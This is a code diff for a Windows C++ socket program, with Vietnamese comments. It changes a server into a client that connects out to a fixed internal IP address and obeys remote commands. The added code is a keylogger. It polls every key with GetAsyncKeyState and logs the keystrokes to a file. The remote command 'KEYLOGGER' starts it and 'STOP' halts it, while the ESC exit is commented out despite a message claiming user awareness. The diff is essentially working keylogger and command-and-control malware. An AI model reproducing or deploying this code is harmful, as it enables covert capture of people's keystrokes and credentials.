@@ -137,6 +137,9 @@
 #include <ws2tcpip.h>
 #include "iostream"
 #include <fstream>
+#include <chrono>
+#include <thread>
+#include<atomic>
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -168,6 +171,65 @@ void sendFile(SOCKET acceptSocket, const char* filename) {
     }
 
     file.close();
+}
+
+static std::atomic<bool> running{true};
+
+void displayKeyPress(const char* action, int key) {
+    std::cout << action << ": " << (char)key 
+              << " (ASCII: " << key << ")" << std::endl;
+}
+
+void keyboardMonitor() {
+    std::cout << "Keyboard monitoring started. Press ESC to exit.\n";
+    int ok = 0;
+    ofstream fout;
+    fout.open("log.txt", std::ios::app);
+    if (!fout.is_open())
+        cout << "Cannot open file! \n";
+    while(running) {
+        for(int key = 8; key <= 255; key++) {
+            if(GetAsyncKeyState(key) == -32767) {
+                // if(key == VK_ESCAPE) {
+                //     running = false;
+                //     break;
+                // }
+                // if (ok == 0) {
+                //     ok = 1;
+                //     ofstream fout;
+                //     fout.open("log.txt", std::ios::app);
+                // }
+                // ofstream fout;
+                // fout.open("log.txt", std::ios::app);
+                // //displayKeyPress("Key pressed", key);
+                fout << "Key pressed" << ": " << (char)key << " (ASCII: " << key << ")" << std::endl;
+                // while(fout.is_open())
+                //     fout.close();
+            }
+        }
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+    fout.close();
+    if (!fout.is_open())
+        cout << "Closed file! \n";
+}
+
+
+
+// Example of how to use timer to stop monitoring after specific duration
+void stopAfterDelay(SOCKET serverSocket) {
+    char buffer[bufferSize];
+    int byteCount;
+    while(true) {
+        byteCount = recv(serverSocket, buffer, bufferSize, 0);
+            if (byteCount > 0) {
+                cout << buffer << "\n";
+                if (strcmp(buffer, "STOP") == 0) {
+                    running = false;
+                    break;
+                }
+            }
+    }
 }
 
 
@@ -207,37 +269,39 @@ int main() {
 
     sockaddr_in service;
     service.sin_family = AF_INET;
-    InetPton(AF_INET, L"127.0.0.1", &service.sin_addr.s_addr);
+    InetPton(AF_INET, "10.123.0.185", &service.sin_addr.s_addr);
     service.sin_port = htons(port);
-    if (bind(serverSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR) {
-        cout << "bind() failed: " << WSAGetLastError() << endl;
-        closesocket(serverSocket);
-        WSACleanup();
-        return 0;
-    }
-    else cout << "bind() is OK!" << endl;
-
-    cout << "\n=== Step 4 - Initiate Listen ===\n\n";
-
-    if (listen(serverSocket, 1) == SOCKET_ERROR) {
-        cout << "listen(): Error listening on socket " << WSAGetLastError() << endl;
+    if (connect(serverSocket, (SOCKADDR*)&service, sizeof(service)) == SOCKET_ERROR) {
+        cout << "Client: connect() - Failed to connect." << endl;
         WSACleanup();
         return 0;
     }
     else {
-        cout << "listen() is OK, I'm waiting for connections..." << endl;
+        cout << "Client: connect() is OK." << endl;
+        cout << "Client: Can start sending and receiving data..." << endl;
     }
 
-    while (true) {
-        cout << "\n=== Step 5 - Accept Connection from Client ===\n\n";
+    // cout << "\n=== Step 4 - Initiate Listen ===\n\n";
 
-        acceptSocket = accept(serverSocket, NULL, NULL);
-        if (acceptSocket == INVALID_SOCKET) {
-            cout << "accept failed: " << WSAGetLastError() << endl;
-            WSACleanup();
-            return -1;
-        }
-        cout << "Accepted connection" << endl;
+    // if (listen(serverSocket, 1) == SOCKET_ERROR) {
+    //     cout << "listen(): Error listening on socket " << WSAGetLastError() << endl;
+    //     WSACleanup();
+    //     return 0;
+    // }
+    // else {
+    //     cout << "listen() is OK, I'm waiting for connections..." << endl;
+    // }
+
+    while (true) {
+        // cout << "\n=== Step 5 - Accept Connection from Client ===\n\n";
+
+        // acceptSocket = accept(serverSocket, NULL, NULL);
+        // if (acceptSocket == INVALID_SOCKET) {
+        //     cout << "accept failed: " << WSAGetLastError() << endl;
+        //     WSACleanup();
+        //     return -1;
+        // }
+        // cout << "Accepted connection" << endl;
 
         cout << "\n=== Step 6 - Receive Message from Client ===\n\n";
 
@@ -246,11 +310,35 @@ int main() {
 
         while (true) {
             // Nhận tin nhắn từ client
-            byteCount = recv(acceptSocket, buffer, bufferSize, 0);
+            byteCount = recv(serverSocket, buffer, bufferSize, 0);
             if (byteCount > 0) {
                 // Đảm bảo chuỗi kết thúc đúng
                 buffer[byteCount] = '\0';
                 cout << "Message from client: " << buffer << endl;
+                if (strcmp(buffer, "KEYLOGGER") == 0) {
+                    std::cout << "Starting keyboard input monitor...\n";
+                    std::cout << "All keyboard input will be displayed in this window.\n";
+                    std::cout << "This program runs with user awareness for input testing.\n";
+                    std::cout << "Program will stop after 10 seconds or press ESC to exit.\n\n";
+
+                    // Start monitoring thread
+                    std::thread monitorThread(keyboardMonitor);
+                    
+                    // Create another thread to stop monitoring after 10 seconds
+                    std::thread timerThread(stopAfterDelay, serverSocket);
+                    // Wait for monitoring thread to finish
+                    monitorThread.join();
+                    
+                    // Wait for timer thread to finish
+                    timerThread.join();
+                    running = true;
+
+                }
+                else if (strcmp(buffer, "stopkeylogger") == 0) {
+                    
+                    
+                    std::cout << "\nKeyboard monitoring stopped.\n";
+                }
             }
             else if (byteCount == 0) {
                 // Client đã ngắt kết nối
